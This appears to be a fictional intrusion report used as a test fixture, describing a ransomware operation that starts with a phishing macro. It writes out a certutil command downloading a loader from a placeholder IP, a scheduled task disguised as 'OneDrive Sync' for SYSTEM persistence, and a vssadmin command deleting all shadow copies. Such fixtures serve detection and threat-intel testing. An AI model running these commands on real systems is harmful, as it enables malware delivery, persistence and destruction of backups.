# Fictional intrusion report: "Operation Paper Lantern" (test fixture, not real CTI)

The actor obtained access through a phishing email carrying a macro-enabled document. On execution
the macro launched `certutil.exe -urlcache -split -f http://198.51.100.23/l.bin C:\Users\Public\l.exe`
to download a loader. Persistence was established with
`schtasks /create /tn "OneDrive Sync" /tr C:\Users\Public\l.exe /sc onlogon /ru SYSTEM`.
Before deploying ransomware, the operators ran `vssadmin delete shadows /all /quiet` on every
reachable host, then encrypted file shares over SMB using stolen domain admin credentials.
